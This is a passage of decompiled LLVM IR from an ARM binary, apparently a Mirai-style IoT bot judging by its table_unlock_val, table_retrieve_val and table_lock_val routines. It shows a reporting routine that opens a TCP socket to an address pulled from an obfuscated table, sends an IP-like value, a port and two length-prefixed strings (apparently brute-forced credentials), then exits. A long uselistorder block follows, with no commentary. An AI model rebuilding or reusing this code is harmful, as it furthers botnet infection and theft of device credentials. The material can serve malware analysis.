  %v9_f110 = icmp eq i32 %v2_f108, %v1_f110
  store i1 %v9_f110, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_f100, i32* %r1.global-to-local, align 4
  %v7_f118 = icmp sgt i32 %v2_f108, %v1_f110
  br i1 %v7_f118, label %dec_label_pc_f11c, label %dec_label_pc_f15c

dec_label_pc_f11c:                                ; preds = %dec_label_pc_f0ec
  %v2_f120 = load i32, i32* @global_var_20f5c.123, align 4
  store i32 %v2_f120, i32* %r3.global-to-local, align 4
  store i32 %v1_f110, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f13c

dec_label_pc_f12c:                                ; preds = %dec_label_pc_f14c, %dec_label_pc_f13c
  %v1_f12c = add i32 %v0_f12c, 1
  store i32 %v1_f12c, i32* %r2.global-to-local, align 4
  %v9_f130 = icmp eq i32 %v1_f12c, %v2_f108
  %v1_f134 = add i32 %v0_f134, 16
  store i32 %v1_f134, i32* %r3.global-to-local, align 4
  br i1 %v9_f130, label %dec_label_pc_f15c.loopexit, label %dec_label_pc_f13c

dec_label_pc_f13c:                                ; preds = %dec_label_pc_f12c, %dec_label_pc_f11c
  %v0_f12c = phi i32 [ %v1_f12c, %dec_label_pc_f12c ], [ %v1_f110, %dec_label_pc_f11c ]
  %v0_f134 = phi i32 [ %v1_f134, %dec_label_pc_f12c ], [ %v2_f120, %dec_label_pc_f11c ]
  store i32 %v0_f134, i32* %r0.global-to-local, align 4
  %v1_f140 = add i32 %v0_f134, 8
  %v2_f140 = inttoptr i32 %v1_f140 to i16*
  %v3_f140 = load i16, i16* %v2_f140, align 2
  %v4_f140 = zext i16 %v3_f140 to i32
  store i32 %v4_f140, i32* %r3.global-to-local, align 4
  %tmp426 = icmp ugt i32 %v4_f140, %v3_f100
  br i1 %tmp426, label %dec_label_pc_f12c, label %dec_label_pc_f14c

dec_label_pc_f14c:                                ; preds = %dec_label_pc_f13c
  %v1_f14c = add i32 %v0_f134, 10
  %v2_f14c = inttoptr i32 %v1_f14c to i16*
  %v3_f14c = load i16, i16* %v2_f14c, align 2
  %v4_f14c = zext i16 %v3_f14c to i32
  store i32 %v4_f14c, i32* %r3.global-to-local, align 4
  %v3_f150 = icmp uge i32 %v4_f14c, %v3_f100
  %v9_f150 = icmp eq i32 %v4_f14c, %v3_f100
  %v2_f154 = xor i1 %v3_f150, true
  %v3_f154 = or i1 %v9_f150, %v2_f154
  br i1 %v3_f154, label %dec_label_pc_f12c, label %dec_label_pc_f160.loopexit

dec_label_pc_f15c.loopexit:                       ; preds = %dec_label_pc_f12c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f15c

dec_label_pc_f15c:                                ; preds = %dec_label_pc_f15c.loopexit, %dec_label_pc_f0ec
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f160

dec_label_pc_f160.loopexit:                       ; preds = %dec_label_pc_f14c
  store i1 %v3_f150, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f160

dec_label_pc_f160:                                ; preds = %dec_label_pc_f160.loopexit, %dec_label_pc_f15c
  %v0_f174 = phi i32 [ %v0_f134, %dec_label_pc_f160.loopexit ], [ 0, %dec_label_pc_f15c ]
  %v0_f160 = load i32, i32* @r5, align 4
  %v1_f160 = add i32 %v0_f160, 4
  %v2_f160 = inttoptr i32 %v1_f160 to i32*
  %v3_f160 = load i32, i32* %v2_f160, align 4
  %v3_f164 = udiv i32 %v3_f160, 32
  store i32 %v3_f164, i32* %r2.global-to-local, align 4
  %v1_f168 = urem i32 %v3_f160, 32
  store i32 %v1_f168, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_f16c = mul nuw nsw i32 %v3_f164, 4
  store i32 %v3_f16c, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_f174 = inttoptr i32 %v0_f160 to i32*
  store i32 %v0_f174, i32* %v2_f174, align 4
  %v0_f178 = load i32, i32* %r3.global-to-local, align 4
  %v1_f178 = load i32, i32* @r5, align 4
  %v2_f178 = add i32 %v1_f178, 24
  %v3_f178 = inttoptr i32 %v2_f178 to i32*
  store i32 %v0_f178, i32* %v3_f178, align 4
  %v0_e600.pre = load i32, i32* @ip, align 4
  %v1_e608.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e5f8

dec_label_pc_f180:                                ; preds = %dec_label_pc_f0b0
  %v0_f180 = load i32, i32* @r5, align 4
  %v1_f180 = add i32 %v0_f180, 4
  %v2_f180 = inttoptr i32 %v1_f180 to i32*
  %v3_f180 = load i32, i32* %v2_f180, align 4
  store i32 %v3_f180, i32* %r0.global-to-local, align 4
  %v1_f184 = call i32 @__GI___libc_close(i32 %v3_f180)
  store i32 %v1_f184, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_f18c = load i32, i32* @r4, align 4
  %v1_f18c = load i32, i32* @r5, align 4
  %v2_f18c = add i32 %v1_f18c, 12
  %v3_f18c = inttoptr i32 %v2_f18c to i32*
  store i32 %v0_f18c, i32* %v3_f18c, align 4
  %v0_f190 = load i32, i32* %r3.global-to-local, align 4
  %v1_f190 = load i32, i32* @r5, align 4
  %v2_f190 = add i32 %v1_f190, 4
  %v3_f190 = inttoptr i32 %v2_f190 to i32*
  store i32 %v0_f190, i32* %v3_f190, align 4
  %v0_f194 = load i32, i32* @r4, align 4
  %v1_f194 = trunc i32 %v0_f194 to i8
  %v2_f194 = load i32, i32* @r5, align 4
  %v3_f194 = add i32 %v2_f194, 284
  %v4_f194 = inttoptr i32 %v3_f194 to i8*
  store i8 %v1_f194, i8* %v4_f194, align 1
  br label %dec_label_pc_e720

dec_label_pc_f19c:                                ; preds = %thread-pre-split103
  %v1_f1a4 = add i32 %v0_f1a4, 12
  %v2_f1a4 = inttoptr i32 %v1_f1a4 to i32*
  %v3_f1a4 = load i32, i32* %v2_f1a4, align 4
  store i32 %v3_f1a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e618.backedge

dec_label_pc_f1e4:                                ; preds = %bb425
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f1f0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_f1f0, i32* %r0.global-to-local, align 4
  %v2_f1f4 = icmp eq i32 %v3_f1f0, -1
  store i1 %v2_f1f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f1f4 = icmp eq i32 %v3_f1f0, -1
  store i1 %v7_f1f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f1f0, i32* @r4, align 4
  br i1 %v7_f1f4, label %dec_label_pc_f340, label %dec_label_pc_f200

dec_label_pc_f200:                                ; preds = %dec_label_pc_f1e4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_f204 = call i32 @table_unlock_val(i32 2)
  store i32 -1378207815, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i16** @global_var_23a30.70 to i32), i32* %r3.global-to-local, align 4
  %v0_f210 = load i32, i32* @r6, align 4
  store i32 %v0_f210, i32* %r1.global-to-local, align 4
  store i32 -1378207815, i32* @global_var_23a34.72, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_f21c = inttoptr i32 %v0_f210 to i32*
  %v3_f21c = call i32 @table_retrieve_val(i32 2, i32* %v2_f21c)
  store i32 %v2_efcc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_f230 = call i32 @table_lock_val(i32 2)
  %v0_f234 = load i32, i32* @r4, align 4
  store i32 %v0_f234, i32* %r0.global-to-local, align 4
  store i32 %v2_efcc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_f240 = call i32 @__libc_connect(i32 %v0_f234, i32 %v2_efcc, i32 16)
  store i32 %v3_f240, i32* %r0.global-to-local, align 4
  %v3_f244 = icmp eq i32 %v3_f240, -1
  store i1 %v3_f244, i1* %cpsr_c.global-to-local, align 1
  %v8_f244 = icmp eq i32 %v3_f240, -1
  store i1 %v8_f244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f244, label %dec_label_pc_f24c, label %dec_label_pc_f29c

dec_label_pc_f24c:                                ; preds = %dec_label_pc_f200
  %v0_f24c = load i32, i32* @r4, align 4
  store i32 %v0_f24c, i32* %r0.global-to-local, align 4
  %v1_f250 = call i32 @__GI___libc_close(i32 %v0_f24c)
  %v0_f254 = load i32, i32* @r6, align 4
  store i32 %v0_f254, i32* %r0.global-to-local, align 4
  %v1_f258 = call i32 @__GI_exit(i32 %v0_f254)
  store i32 %v1_f258, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f25c

dec_label_pc_f25c:                                ; preds = %dec_label_pc_e6cc, %dec_label_pc_f24c
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_f260 = load i32, i32* @sb, align 4
  %v2_f260 = inttoptr i32 %v1_f260 to i32*
  store i32 104, i32* %v2_f260, align 4
  br label %dec_label_pc_e6e4

dec_label_pc_f268:                                ; preds = %dec_label_pc_e46c
  store i32 %v3_f268, i32* %r0.global-to-local, align 4
  %v3_f270 = udiv i32 %v3_f268, 32
  %v3_f274 = mul nuw nsw i32 %v3_f270, 4
  store i32 %v2_f278, i32* @lr, align 4
  %v2_f27c = add i32 %v3_f274, %v2_f278
  store i32 %v2_f27c, i32* %r3.global-to-local, align 4
  %v1_f280 = add i32 %v2_f27c, -312
  %v2_f280 = inttoptr i32 %v1_f280 to i32*
  %v3_f280 = load i32, i32* %v2_f280, align 4
  %v1_f284 = urem i32 %v3_f268, 32
  store i32 %v1_f284, i32* %r1.global-to-local, align 4
  %v7_f288 = shl i32 1, %v1_f284
  %v8_f288 = or i32 %v3_f280, %v7_f288
  store i32 %v8_f288, i32* %r2.global-to-local, align 4
  %v0_f28c = load i32, i32* @r5, align 4
  %v3_f28c = icmp uge i32 %v0_f28c, %v3_f268
  store i1 %v3_f28c, i1* %cpsr_c.global-to-local, align 1
  %v9_f28c = icmp eq i32 %v0_f28c, %v3_f268
  store i1 %v9_f28c, i1* %cpsr_z.global-to-local, align 1
  %v5_f290 = icmp slt i32 %v0_f28c, %v3_f268
  br i1 %v5_f290, label %bb427, label %bb428

bb427:                                            ; preds = %dec_label_pc_f268
  store i32 %v3_f268, i32* @r5, align 4
  br label %bb428

bb428:                                            ; preds = %dec_label_pc_f268, %bb427
  store i32 %v8_f288, i32* %v2_f280, align 4
  br label %bb378

dec_label_pc_f29c:                                ; preds = %dec_label_pc_f200
  store i32 %v2_eca4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f2ac = load i32, i32* @r4, align 4
  store i32 %v0_f2ac, i32* %r0.global-to-local, align 4
  %v0_f2b0 = load i32, i32* @r6, align 4
  %v6_f2b0 = trunc i32 %v0_f2b0 to i8
  store i8 %v6_f2b0, i8* %stack_var_-56, align 1
  %v6_f2b4 = call i32 @__libc_send(i32 %v0_f2ac, i32 %v2_eca4, i32 1, i32 16384)
  store i32 %v2_ec90, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f2c8 = load i32, i32* @r4, align 4
  store i32 %v0_f2c8, i32* %r0.global-to-local, align 4
  %v4_f2cc = call i32 @__libc_send(i32 %v0_f2c8, i32 %v2_ec90, i32 4, i32 16384)
  %v2_f2d4 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_f2d4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f2e0 = load i32, i32* @r4, align 4
  store i32 %v0_f2e0, i32* %r0.global-to-local, align 4
  %v4_f2e4 = call i32 @__libc_send(i32 %v0_f2e0, i32 %v2_f2d4, i32 2, i32 16384)
  %v0_f2e8 = load i32, i32* @r8, align 4
  %v1_f2e8 = add i32 %v0_f2e8, 12
  store i32 %v1_f2e8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f2f4 = load i32, i32* @r4, align 4
  store i32 %v0_f2f4, i32* %r0.global-to-local, align 4
  %v4_f2f8 = call i32 @__libc_send(i32 %v0_f2f4, i32 %v1_f2e8, i32 1, i32 16384)
  store i32 %v4_f2f8, i32* %r0.global-to-local, align 4
  %v0_f2fc = load i32, i32* @r8, align 4
  %v1_f2fc = inttoptr i32 %v0_f2fc to i32*
  %v2_f2fc = load i32, i32* %v1_f2fc, align 4
  store i32 %v2_f2fc, i32* %r1.global-to-local, align 4
  %v1_f300 = add i32 %v0_f2fc, 12
  %v2_f300 = inttoptr i32 %v1_f300 to i8*
  %v3_f300 = load i8, i8* %v2_f300, align 1
  %v4_f300 = zext i8 %v3_f300 to i32
  store i32 %v4_f300, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f308 = load i32, i32* @r4, align 4
  store i32 %v0_f308, i32* %r0.global-to-local, align 4
  %v4_f30c = call i32 @__libc_send(i32 %v0_f308, i32 %v2_f2fc, i32 %v4_f300, i32 16384)
  %v0_f310 = load i32, i32* @r8, align 4
  %v1_f310 = add i32 %v0_f310, 13
  store i32 %v1_f310, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f31c = load i32, i32* @r4, align 4
  store i32 %v0_f31c, i32* %r0.global-to-local, align 4
  %v4_f320 = call i32 @__libc_send(i32 %v0_f31c, i32 %v1_f310, i32 1, i32 16384)
  %v0_f324 = load i32, i32* @r4, align 4
  store i32 %v0_f324, i32* %r0.global-to-local, align 4
  %v0_f328 = load i32, i32* @r8, align 4
  %v1_f328 = add i32 %v0_f328, 13
  %v2_f328 = inttoptr i32 %v1_f328 to i8*
  %v3_f328 = load i8, i8* %v2_f328, align 1
  %v4_f328 = zext i8 %v3_f328 to i32
  store i32 %v4_f328, i32* %r2.global-to-local, align 4
  %v1_f32c = add i32 %v0_f328, 4
  %v2_f32c = inttoptr i32 %v1_f32c to i32*
  %v3_f32c = load i32, i32* %v2_f32c, align 4
  store i32 %v3_f32c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f334 = call i32 @__libc_send(i32 %v0_f324, i32 %v3_f32c, i32 %v4_f328, i32 16384)
  %v0_f338 = load i32, i32* @r4, align 4
  store i32 %v0_f338, i32* %r0.global-to-local, align 4
  %v1_f33c = call i32 @__GI___libc_close(i32 %v0_f338)
  store i32 %v1_f33c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f340

dec_label_pc_f340:                                ; preds = %dec_label_pc_f1e4, %dec_label_pc_f29c
  %v0_f340 = load i32, i32* @r6, align 4
  store i32 %v0_f340, i32* %r0.global-to-local, align 4
  %v1_f344 = call i32 @__GI_exit(i32 %v0_f340)
  store i32 %v1_f344, i32* %r0.global-to-local, align 4
  ret i32 %v1_f344

; uselistorder directives
  uselistorder i32 %v0_f28c, { 0, 2, 1 }
  uselistorder i32 %v1_f284, { 1, 0 }
  uselistorder i1 %v7_f1f4, { 1, 0 }
  uselistorder i32 %v3_f1f0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_f1a4, { 1, 0 }
  uselistorder i32 %v3_f160, { 1, 0 }
  uselistorder i1 %v3_f150, { 1, 0 }
  uselistorder i32 %v0_f134, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v3_f100, { 2, 1, 0, 3 }
  uselistorder i32 %v3_f0fc, { 1, 0 }
  uselistorder i32 %v0_f0f4, { 1, 0 }
  uselistorder i32 %v4_f084, { 1, 0, 2 }
  uselistorder i32 %v3_f030, { 1, 0 }
  uselistorder i1 %v2_eff8, { 1, 0 }
  uselistorder i32 %.432, { 1, 0 }
  uselistorder i1 %v7_efe0, { 1, 0 }
  uselistorder i32 %v0_efdc, { 2, 1, 0, 3 }
  uselistorder i1 %v7_efb4, { 1, 0 }
  uselistorder i32 %v0_efb4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_ef38, { 1, 0 }
  uselistorder i32 %v0_ef1c.pr, { 1, 0 }
  uselistorder i32 %v0_eee8, { 1, 2, 0 }
  uselistorder i32 %v0_eeac, { 1, 0 }
  uselistorder i32 %v1_eea4, { 1, 0 }
  uselistorder i32 %v1_ee9c, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_ee98, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_ee98, { 0, 2, 1 }
  uselistorder i32 %v0_ee78.pr, { 1, 0 }
  uselistorder i32 %v0_ee58.pr, { 1, 0 }
  uselistorder i1 %v7_ee30, { 1, 0 }
  uselistorder i1 %v2_ee20, { 1, 0, 2 }
  uselistorder i1 %v2_ee04, { 1, 0, 2 }
  uselistorder i32 %v1_ee24, { 1, 2, 3, 0 }
  uselistorder i32 %v1_edf8, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_ee28, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_edac, { 1, 0 }
  uselistorder i32 %v0_f1a4, { 1, 0, 2 }
  uselistorder i1 %v0_ed9c, { 1, 0 }
  uselistorder i32 %v4_ed90, { 1, 0, 2 }
  uselistorder i32 %v1_ed5c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_ed5c, { 0, 2, 1 }
  uselistorder i32 %v0_ed54, { 1, 0 }
  uselistorder i1 %v7_ed50, { 1, 0 }
  uselistorder i1 %v7_ed48, { 1, 0 }
  uselistorder i1 %v8_ed40, { 1, 0 }
  uselistorder i1 %v7_ed24, { 1, 0 }
  uselistorder i1 %v7_ed1c, { 1, 0 }
  uselistorder i1 %v8_ed14, { 1, 0 }
  uselistorder i32 %v1_ecfc, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v7_eccc, { 1, 0 }
  uselistorder i32 %v1_ec74, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_ec74, { 0, 2, 1 }
  uselistorder i32 %v0_ec6c, { 1, 0 }
  uselistorder i1 %v7_ec68, { 1, 0 }
  uselistorder i1 %v7_ec60, { 1, 0 }
  uselistorder i1 %v7_ec58, { 1, 0 }
  uselistorder i1 %v8_ec50, { 1, 0 }
  uselistorder i1 %v7_ec34, { 1, 0 }
  uselistorder i1 %v7_ec2c, { 1, 0 }
  uselistorder i1 %v7_ec24, { 1, 0 }
  uselistorder i1 %v8_ec1c, { 1, 0 }
  uselistorder i32 %v1_ec04, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_eba0, { 1, 0 }
  uselistorder i8 %v3_eb98, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_eb90, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_eb90, { 0, 2, 1 }
  uselistorder i32 %v0_eb88, { 1, 0 }
  uselistorder i1 %v7_eb84, { 1, 0 }
  uselistorder i1 %v7_eb7c, { 1, 0 }
  uselistorder i1 %v7_eb74, { 1, 0 }
  uselistorder i1 %v7_eb60, { 1, 0 }
  uselistorder i1 %v7_eb58, { 1, 0 }
  uselistorder i1 %v7_eb50, { 1, 0 }
  uselistorder i1 %v8_eb48, { 1, 0 }
  uselistorder i32 %v1_eb30, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_eacc, { 1, 0 }
  uselistorder i8 %v3_eac4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_eabc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_eabc, { 0, 2, 1 }
  uselistorder i32 %v0_eab4, { 1, 0 }
  uselistorder i1 %v7_eab0, { 1, 0 }
  uselistorder i1 %v7_eaa8, { 1, 0 }
  uselistorder i1 %v7_eaa0, { 1, 0 }
  uselistorder i1 %v7_ea8c, { 1, 0 }
  uselistorder i1 %v7_ea84, { 1, 0 }
  uselistorder i1 %v7_ea7c, { 1, 0 }
  uselistorder i1 %v8_ea74, { 1, 0 }
  uselistorder i32 %v1_ea5c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_e9f8, { 1, 0 }
  uselistorder i8 %v3_e9f0, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e9e8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_e9e8, { 0, 2, 1 }
  uselistorder i32 %v0_e9e0, { 1, 0 }
  uselistorder i1 %v7_e9dc, { 1, 0 }
  uselistorder i1 %v7_e9d4, { 1, 0 }
  uselistorder i1 %v7_e9cc, { 1, 0 }
  uselistorder i1 %v7_e9b8, { 1, 0 }
  uselistorder i1 %v7_e9b0, { 1, 0 }
  uselistorder i1 %v7_e9a8, { 1, 0 }
  uselistorder i1 %v8_e9a0, { 1, 0 }
  uselistorder i32 %v1_e988, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_e924, { 1, 0 }
  uselistorder i8 %v3_e91c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e914, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_e914, { 0, 2, 1 }
  uselistorder i32 %v0_e90c, { 1, 0 }
  uselistorder i1 %v7_e908, { 1, 0 }
  uselistorder i1 %v7_e900, { 1, 0 }
  uselistorder i1 %v7_e8f8, { 1, 0 }
  uselistorder i1 %v7_e8e4, { 1, 0 }
  uselistorder i1 %v7_e8dc, { 1, 0 }
  uselistorder i1 %v7_e8d4, { 1, 0 }
  uselistorder i1 %v8_e8cc, { 1, 0 }
  uselistorder i32 %v1_e8b4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_e850, { 1, 0 }
  uselistorder i8 %v3_e848, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e840, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_e840, { 0, 2, 1 }
  uselistorder i32 %v0_e838, { 1, 0 }
  uselistorder i1 %v7_e834, { 1, 0 }
  uselistorder i1 %v7_e82c, { 1, 0 }
  uselistorder i1 %v7_e824, { 1, 0 }
  uselistorder i1 %v7_e810, { 1, 0 }
  uselistorder i1 %v7_e808, { 1, 0 }
  uselistorder i1 %v7_e800, { 1, 0 }
  uselistorder i1 %v8_e7f8, { 1, 0 }
  uselistorder i32 %v1_e7e0, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_e7cc, { 1, 2, 0 }
  uselistorder i32 %v2_e7b8, { 1, 0 }
  uselistorder i32 %v0_e7b8, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_e7b4, { 2, 1, 4, 0, 5, 3 }
  uselistorder i32 %v1_e78c, { 2, 1, 0 }
  uselistorder i1 %v7_e768, { 1, 0 }
  uselistorder i32 %v4_e764, { 1, 0, 2 }
  uselistorder i32 %v1_e724, { 0, 2, 3, 4, 1 }
  uselistorder i1 %v1_e700, { 1, 0 }
  uselistorder i32 %v1_e6f4, { 2, 1, 0 }
  uselistorder i32 %v1_e6f0, { 1, 0 }
  uselistorder i32 %v0_e694, { 2, 21, 4, 3, 20, 19, 5, 6, 23, 7, 8, 22, 9, 10, 24, 11, 12, 27, 13, 14, 25, 15, 16, 26, 17, 18, 28, 29, 1, 0 }
  uselistorder i32 %v1_e670, { 1, 2, 3, 0 }
  uselistorder i32 %v3_e66c, { 1, 0 }
  uselistorder i32 %v4_e650, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v2_e63c, { 1, 0, 2 }
  uselistorder i32 %v3_e638, { 1, 0, 2 }
  uselistorder i32 %v0_f040, { 1, 0, 2 }
  uselistorder i32 %v3_e604, { 1, 0 }
  uselistorder i32 %v1_e5e8, { 3, 2, 1, 0 }
  uselistorder i32 %v3_e5e4, { 1, 0 }
  uselistorder i32 %v3_e5dc, { 1, 2, 0 }
  uselistorder i1 %v7_e5c8, { 1, 0 }
  uselistorder i32 %v3_e5c4, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_e5b8, { 1, 0 }
  uselistorder i32 %v2_efcc, { 1, 0, 2, 3 }
  uselistorder i32* %v2_ecac, { 1, 2, 3, 0 }
  uselistorder i32 %v2_eca4, { 4, 5, 1, 0, 3, 6, 7, 2 }
  uselistorder i32 %v2_ec90, { 1, 0, 3, 2, 9, 8, 5, 7, 6, 4 }
  uselistorder i32 %v2_eedc, { 1, 0 }
  uselistorder i32 %v1_e568, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e568, { 0, 1, 3, 2 }
  uselistorder i32 %v1_e534, { 2, 1, 0 }
  uselistorder i32 %v1_e530, { 1, 0 }
  uselistorder i1 %v2_e510, { 1, 0, 2 }
  uselistorder i32 %v0_e50c, { 1, 0, 2 }
  uselistorder i1 %v7_e4d8, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_e4d8, { 1, 0, 2 }
  uselistorder i32 %v2_e4d0, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_e4c4, { 1, 0, 2 }
  uselistorder i32 %v0_e4c8, { 1, 0 }
  uselistorder i32 %v1_e4ac, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_e4a0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e4a0, { 0, 2, 1 }
  uselistorder i32 %v1_e490, { 1, 0 }
  uselistorder i32 %v3_f268, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v2_f278, { 0, 7, 1, 5, 2, 4, 3, 6 }
  uselistorder i32 %v1_e3e0, { 1, 0 }
  uselistorder i32 %v1_e3c8, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e3d4, { 0, 3, 2, 1 }
  uselistorder i32 %v0_e384, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_e378, { 2, 1, 0 }
  uselistorder i32 %v1_e358, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v2_e334, { 1, 0 }
  uselistorder i1 %v9_e300, { 1, 0 }
  uselistorder i32 %v0_e2b0, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e254, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_e204, { 1, 0 }
  uselistorder i32 %v5_e19c, { 1, 0 }
  uselistorder i1 %v2_e0e4, { 1, 0 }
  uselistorder i1 %v3_e0c8, { 1, 0, 2 }
  uselistorder i1 %v2_e0b4, { 1, 0 }
  uselistorder i1 %v2_e090, { 1, 0 }
  uselistorder i32 %v1_e040, { 14, 13, 12, 11, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e02c, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 20, 21, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_e028, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v0_e010, { 1, 0 }
  uselistorder i32 %v0_dfe8, { 1, 0 }
  uselistorder i32 %stack_var_-1880.0, { 0, 1, 2, 3, 4, 5, 7, 9, 12, 11, 6, 8, 10, 14, 13 }
  uselistorder i16 %v5_d320.le, { 0, 2, 1 }
  uselistorder i32 %v0_d304, { 3, 2, 0, 1 }
  uselistorder i1 %v7_d2a4, { 1, 0 }
  uselistorder i32 %v3_d29c, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_d288, { 1, 0 }
  uselistorder i32 %v0_d258, { 1, 0 }
  uselistorder i32 %storemerge308, { 1, 0 }
  uselistorder i32 %v0_cf08, { 3, 1, 2, 0, 4 }
  uselistorder i16* %stack_var_-52, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0, 2 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-224, { 1, 0 }
  uselistorder i32* %stack_var_-352, { 1, 0 }
  uselistorder i8* %stack_var_-56, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-60, { 6, 7, 8, 0, 9, 1, 10, 4, 11, 2, 12, 3, 13, 5, 14 }
  uselistorder i32* %stack_var_-42, { 1, 0 }
